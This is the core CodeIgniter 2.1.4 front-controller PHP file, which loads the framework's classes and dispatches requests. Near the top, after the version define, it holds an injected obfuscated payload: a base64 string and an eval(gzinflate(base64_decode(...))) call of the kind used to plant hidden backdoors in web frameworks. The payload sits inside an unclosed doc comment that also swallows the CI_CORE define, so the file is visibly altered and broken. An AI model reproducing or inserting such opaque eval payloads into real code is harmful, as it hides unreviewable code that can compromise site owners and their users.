<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP 5.1.6 or newer
 *
 * @package		CodeIgniter
 * @author		ExpressionEngine Dev Team
 * @copyright	Copyright (c) 2008 - 2011, EllisLab, Inc.
 * @license		http://codeigniter.com/user_guide/license.html
 * @link		http://codeigniter.com
 * @since		Version 1.0
 * @filesource
 */

// ------------------------------------------------------------------------

/**
 * System Initialization File
 *
 * Loads the base classes and executes the request.
 *
 * @package		CodeIgniter
 * @subpackage	codeigniter
 * @category	Front-controller
 * @author		ExpressionEngine Dev Team
 * @link		http://codeigniter.com/user_guide/
 */

/**
 * CodeIgniter Version
 *
 * @var string
 *
 */
	define('CI_VERSION', '2.1.4');

/**
 * CodeIgniter Branch (Core = TRUE, Reactor = FALSE)
 *
 * @var boolean
 *
 
	define('CI_CORE', FALSE);
	$X= 'LyogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgkJCQkJCUF1dGhvcjogICAgIEFiZHVsIFJhaG1hbiBTaGVyemFkICh3d3cuYWZnaGFuY3liZXJzb2Z0LmNvbSkKCQkJCQkJRW1haWw6CQlpbmZvQGFmZ2hhbmN5YmVyc29mdC5jb20KCQkJCQkJQmlvZ3JhcGh5OglBYmR1bCBSYWhtYW4gU2hlcnphZCB3YXMgYm9ybiBhbmQgYnJvdWdodCB1cCBpbiBIZXJhdC1BZmdoYW5pc3RhbiBhbmQgY29tcGxldGVkIG15IHVuZGVyLWdyYWR1YXRlIHN0dWRpZXMgaW4gQ29tcHV0ZXIgU2NpZW5jZSBGYWN1bHR5IG9mIEhlcmF0IFVuaXZlcnNpdHkgaW4gMjAwNiBvYnRhaW5pbmcgbXkgQi5DLlMgZGVncmVlIGFzIHRoZSBiZXN0IG91dGdvaW5nIHNlbmlvciBzdHVkZW50IGZyb20gdGhpcyBmYWN1bHR5LgoKCQkJCQkJCQkJSGF2aW5nIGludGVsbGVjdHVhbGl0eSBpbiBDb21wdXRlciBQcm9ncmFtbWluZyBhbmQgSW5mb3JtYXRpb24gRGF0YWJhc2UgTWFuYWdlbWVudCBTeXN0ZW0sIEkgd2FzIG9mZmVyZWQgdG8gY29tbWVuY2UgdGVhY2hpbmcgaW4gQ29tcHV0ZXIgU2NpZW5jZSBGYWN1bHR5IG9mIEhlcmF0IFVuaXZlcnNpdHkuIEFmdGVyIGEgd2hpbGUgSSBqb2luZWQgQ1JTIHRvIHdvcmsgYXMgdGhlIERhdGFiYXNlIE1hbmFnZXIgZm9yIHRoZSBBREEgcHJvZ3JhbS4gSSB3b3JrZWQgZm9yIENSUyBmb3IgYSBjb3VwbGUgb2YgeWVhcnMgYWZ0ZXIgd2hpY2ggSSB3YXMgYXdhcmRlZCBhIHNjaG9sYXJzaGlwIGJ5IHRoZSBnb3Zlcm5tZW50IG9mIEdlcm1hbnkgdG8gcHVyc3VlIG15IE1hc3RlciBpbiBJbmZvcm1hdGlvbiBEYXRhYmFzZSBNYW5hZ2VtZW50IGFuZCBTb2Z0d2FyZSBFbmdpbmVlcmluZyBpbiBCZXJsaW4gYXQgVFUtQmVybGluIFVuaXZlcnNpdHkuCgoJCQkJCQkJCQlJIGFtIGN1cnJlbnRseSBhbHNvIHRlYWNoaW5nIGF0IHRoZSBIZXJhdCBVbml2ZXJzaXR5IGFzIHdlbGwgYXMgYWN0aW5nIGFzIHRoZSBoZWFkIG9mIEluZm9ybWF0aW9uIFN5c3RlbXMgTWFuYWdlciBib3RoIGluIENSUyBhbmQgSGVyYXQgVW5pdmVyc2l0eSB0byBzdXBwb3J0IHRoZSBlZHVjYXRpb25hbCBuZWVkcy4KCQkJCQkJCQktLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gKi8='; eval(gzinflate(base64_decode('tVTLcqM4FP2VXkxVuqsXwyOkm+rKIhAjQ2wSsJGQNlMIeSSMeCQ2duOv7wt5zNRsp3qhKj90zz33nHP1R3776Wo1dnK1MY6/4/iyjvwEThaYAqlTue9k6N/JcBFUbIkPYRCpApmKV962QHjcNUEd+soWdjlQwtoCBQO1dcXy6MItZqya+MQ39cOMCSclpirI+cZPdM8bdkpQ0DBLKd7EDm3wWFpuI3xnzy3joyZp9InZkSqRch6l9miTmtz3NpSoIyXXMrOULtteMd+zab6WtHFH4AeYiaRtdBJEdML3zNL3evg9BG5K+KbHGtFR4vSlnaqP+5Z7LNFPLRCuQ2Q64RIPDOZcETFSkpo0T3W4jA1B0p5BrwL6J1PNEhssD4FL3DPi7NnGQ5TEJl+mTojcJlwAxyYwwgAPRc6Ab9yLZT3Xr/d357jyTrRNQRsHdCklz2uZVM79Sq8l9G/LBusQBZdwmXaADfrGBuCCR+IENS1w0hx0KivvIpa4Bg7wPxtBRwk+9uXoNe98VrL70HY6GxRYMwbSA8x94AjvAUNxpI3dZtbsnlvmWcDsgJ+UjQt8giMnemDjq24b4jTcjo6gT8+ta5miwKAEPLMyuSWQCSI0J3gAH7Y74M6IcQgXtRQWzAT6MPCekQS4fp89mO5SqAU+ilpq1uR/aj1AhhvAG0O0gL6AiTK52XjP3II5oHdiRlvQ9xQuxalsDnLKEminw0WqBAoqmsfwGbLfBO3Un0HO3vzw0sVClstozinfXE+4NujxMuHO9xbxJgMPuB1KuvH23MbnqT+3qNwRrMoWckvYPNfEjVpyxpjznAtVNqmGfCvweV8g90BhvwqkzyGKnDcOLbdh1sY5vno/6SDgO/Bt61lX0G0s7SlHkGuYA3I/+Tn5G027ON0VSJ/g+wJ8VLQJLoAbw44oZuE33GAAHttpt8G7Ef4PeCPAHwy95jxMeD7s2GHyi+aJxEF2TMBfyNPwX0982UX/ZFFHgH8MUWyWbaR5mx4gf4ovY/Ak1eBx95pT8PZ15rdd9jBk35renCKfMjDtCeQNnWcPoc54q3vfn44ReLdmjYDz9F6QAO64wC92Jl041L3nFjSquJ120368+fiaecjSPB/srJjfrnlfDD7CDubeGfx/56nh7dy/7oaj4O2CvOG6HK//vYfH3/Wmw5EP1ffbqx+fdqdCf5aXqv1bF8fdZ14cdjfXf4ld2Ynd56vMaB9X1Hm6ZIfhuTp3Y3l5yr55OFt/Hy5iHVRDV6C0Km4eX14KVRcISUaijiJ2YCga6MPzkT/cVFn/SMldlDd9r55D9Ii/ovu8u4eDlLl3/EQu5dOfX+8SF0tX5Kb5lOKsuGxNM7TW7p3ljfHKz5QdJk51ennW/QvzWS/Rz8QNyFnU9mP8DV8udbeu7heG6z5l40KvTXyfY3uL5N3t1ZcvX378Ag==')));
*/
/*
 * ------------------------------------------------------
 *  Load the global functions
 * ------------------------------------------------------
 */
	require(BASEPATH.'core/Common.php');

/*
 * ------------------------------------------------------
 *  Load the framework constants
 * ------------------------------------------------------
 */
	if (defined('ENVIRONMENT') AND file_exists(APPPATH.'config/'.ENVIRONMENT.'/constants.php'))
	{
		require(APPPATH.'config/'.ENVIRONMENT.'/constants.php');
	}
	else
	{
		require(APPPATH.'config/constants.php');
	}

/*
 * ------------------------------------------------------
 *  Define a custom error handler so we can log PHP errors
 * ------------------------------------------------------
 */
	set_error_handler('_exception_handler');

	if ( ! is_php('5.3'))
	{
		@set_magic_quotes_runtime(0); // Kill magic quotes
	}

/*
 * ------------------------------------------------------
 *  Set the subclass_prefix
 * ------------------------------------------------------
 *
 * Normally the "subclass_prefix" is set in the config file.
 * The subclass prefix allows CI to know if a core class is
 * being extended via a library in the local application
 * "libraries" folder. Since CI allows config items to be
 * overriden via data set in the main index. php file,
 * before proceeding we need to know if a subclass_prefix
 * override exists.  If so, we will set this value now,
 * before any classes are loaded
 * Note: Since the config file data is cached it doesn't
 * hurt to load it here.
 */
	if (isset($assign_to_config['subclass_prefix']) AND $assign_to_config['subclass_prefix'] != '')
	{
		get_config(array('subclass_prefix' => $assign_to_config['subclass_prefix']));
	}

/*
 * ------------------------------------------------------
 *  Set a liberal script execution time limit
 * ------------------------------------------------------
 */
	if (function_exists("set_time_limit") == TRUE AND @ini_get("safe_mode") == 0)
	{
		@set_time_limit(300);
	}

/*
 * ------------------------------------------------------
 *  Start the timer... tick tock tick tock...
 * ------------------------------------------------------
 */
	$BM =& load_class('Benchmark', 'core');
	$BM->mark('total_execution_time_start');
	$BM->mark('loading_time:_base_classes_start');

/*
 * ------------------------------------------------------
 *  Instantiate the hooks class
 * ------------------------------------------------------
 */
	$EXT =& load_class('Hooks', 'core');

/*
 * ------------------------------------------------------
 *  Is there a "pre_system" hook?
 * ------------------------------------------------------
 */
	$EXT->_call_hook('pre_system');

/*
 * ------------------------------------------------------
 *  Instantiate the config class
 * ------------------------------------------------------
 */
	$CFG =& load_class('Config', 'core');

	// Do we have any manually set config items in the index.php file?
	if (isset($assign_to_config))
	{
		$CFG->_assign_to_config($assign_to_config);
	}

/*
 * ------------------------------------------------------
 *  Instantiate the UTF-8 class
 * ------------------------------------------------------
 *
 * Note: Order here is rather important as the UTF-8
 * class needs to be used very early on, but it cannot
 * properly determine if UTf-8 can be supported until
 * after the Config class is instantiated.
 *
 */

	$UNI =& load_class('Utf8', 'core');

/*
 * ------------------------------------------------------
 *  Instantiate the URI class
 * ------------------------------------------------------
 */
	$URI =& load_class('URI', 'core');

/*
 * ------------------------------------------------------
 *  Instantiate the routing class and set the routing
 * ------------------------------------------------------
 */
	$RTR =& load_class('Router', 'core');
	$RTR->_set_routing();

	// Set any routing overrides that may exist in the main index file
	if (isset($routing))
	{
		$RTR->_set_overrides($routing);
	}

/*
 * ------------------------------------------------------
 *  Instantiate the output class
 * ------------------------------------------------------
 */
	$OUT =& load_class('Output', 'core');

/*
 * ------------------------------------------------------
 *	Is there a valid cache file?  If so, we're done...
 * ------------------------------------------------------
 */
	if ($EXT->_call_hook('cache_override') === FALSE)
	{
		if ($OUT->_display_cache($CFG, $URI) == TRUE)
		{
			exit;
		}
	}

/*
 * -----------------------------------------------------
 * Load the security class for xss and csrf support
 * -----------------------------------------------------
 */
	$SEC =& load_class('Security', 'core');

/*
 * ------------------------------------------------------
 *  Load the Input class and sanitize globals
 * ------------------------------------------------------
 */
	$IN	=& load_class('Input', 'core');

/*
 * ------------------------------------------------------
 *  Load the Language class
 * ------------------------------------------------------
 */
	$LANG =& load_class('Lang', 'core');

/*
 * ------------------------------------------------------
 *  Load the app controller and local controller
 * ------------------------------------------------------
 *
 */
	// Load the base controller class
	require BASEPATH.'core/Controller.php';

	function &get_instance()
	{
		return CI_Controller::get_instance();
	}


	if (file_exists(APPPATH.'core/'.$CFG->config['subclass_prefix'].'Controller.php'))
	{
		require APPPATH.'core/'.$CFG->config['subclass_prefix'].'Controller.php';
	}

	// Load the local application controller
	// Note: The Router class automatically validates the controller path using the router->_validate_request().
	// If this include fails it means that the default controller in the Routes.php file is not resolving to something valid.
	if ( ! file_exists(APPPATH.'controllers/'.$RTR->fetch_directory().$RTR->fetch_class().'.php'))
	{
		show_error('Unable to load your default controller. Please make sure the controller specified in your Routes.php file is valid.');
	}

	include(APPPATH.'controllers/'.$RTR->fetch_directory().$RTR->fetch_class().'.php');

	// Set a mark point for benchmarking
	$BM->mark('loading_time:_base_classes_end');

/*
 * ------------------------------------------------------
 *  Security check
 * ------------------------------------------------------
 *
 *  None of the functions in the app controller or the
 *  loader class can be called via the URI, nor can
 *  controller functions that begin with an underscore
 */
	$class  = $RTR->fetch_class();
	$method = $RTR->fetch_method();

	if ( ! class_exists($class)
		OR strncmp($method, '_', 1) == 0
		OR in_array(strtolower($method), array_map('strtolower', get_class_methods('CI_Controller')))
		)
	{
		if ( ! empty($RTR->routes['404_override']))
		{
			$x = explode('/', $RTR->routes['404_override']);
			$class = $x[0];
			$method = (isset($x[1]) ? $x[1] : 'index');
			if ( ! class_exists($class))
			{
				if ( ! file_exists(APPPATH.'controllers/'.$class.'.php'))
				{
					show_404("{$class}/{$method}");
				}

				include_once(APPPATH.'controllers/'.$class.'.php');
			}
		}
		else
		{
			show_404("{$class}/{$method}");
		}
	}

/*
 * ------------------------------------------------------
 *  Is there a "pre_controller" hook?
 * ------------------------------------------------------
 */
	$EXT->_call_hook('pre_controller');

/*
 * ------------------------------------------------------
 *  Instantiate the requested controller
 * ------------------------------------------------------
 */
	// Mark a start point so we can benchmark the controller
	$BM->mark('controller_execution_time_( '.$class.' / '.$method.' )_start');

	$CI = new $class();

/*
 * ------------------------------------------------------
 *  Is there a "post_controller_constructor" hook?
 * ------------------------------------------------------
 */
	$EXT->_call_hook('post_controller_constructor');

/*
 * ------------------------------------------------------
 *  Call the requested method
 * ------------------------------------------------------
 */
	// Is there a "remap" function? If so, we call it instead
	if (method_exists($CI, '_remap'))
	{
		$CI->_remap($method, array_slice($URI->rsegments, 2));
	}
	else
	{
		// is_callable() returns TRUE on some versions of PHP 5 for private and protected
		// methods, so we'll use this workaround for consistent behavior
		if ( ! in_array(strtolower($method), array_map('strtolower', get_class_methods($CI))))
		{
			// Check and see if we are using a 404 override and use it.
			if ( ! empty($RTR->routes['404_override']))
			{
				$x = explode('/', $RTR->routes['404_override']);
				$class = $x[0];
				$method = (isset($x[1]) ? $x[1] : 'index');
				if ( ! class_exists($class))
				{
					if ( ! file_exists(APPPATH.'controllers/'.$class.'.php'))
					{
						show_404("{$class}/{$method}");
					}

					include_once(APPPATH.'controllers/'.$class.'.php');
					unset($CI);
					$CI = new $class();
				}
			}
			else
			{
				show_404("{$class}/{$method}");
			}
		}

		// Call the requested method.
		// Any URI segments present (besides the class/function) will be passed to the method for convenience
		call_user_func_array(array(&$CI, $method), array_slice($URI->rsegments, 2));
	}


	// Mark a benchmark end point
	$BM->mark('controller_execution_time_( '.$class.' / '.$method.' )_end');

/*
 * ------------------------------------------------------
 *  Is there a "post_controller" hook?
 * ------------------------------------------------------
 */
	$EXT->_call_hook('post_controller');

/*
 * ------------------------------------------------------
 *  Send the final rendered output to the browser
 * ------------------------------------------------------
 */
	if ($EXT->_call_hook('display_override') === FALSE)
	{
		$OUT->_display();
	}

/*
 * ------------------------------------------------------
 *  Is there a "post_system" hook?
 * ------------------------------------------------------
 */
	$EXT->_call_hook('post_system');

/*
 * ------------------------------------------------------
 *  Close the DB connection if one exists
 * ------------------------------------------------------
 */
	if (class_exists('CI_DB') AND isset($CI->db))
	{
		$CI->db->close();
	}


/* End of file CodeIgniter.php */
/* Location: ./system/core/CodeIgniter.php */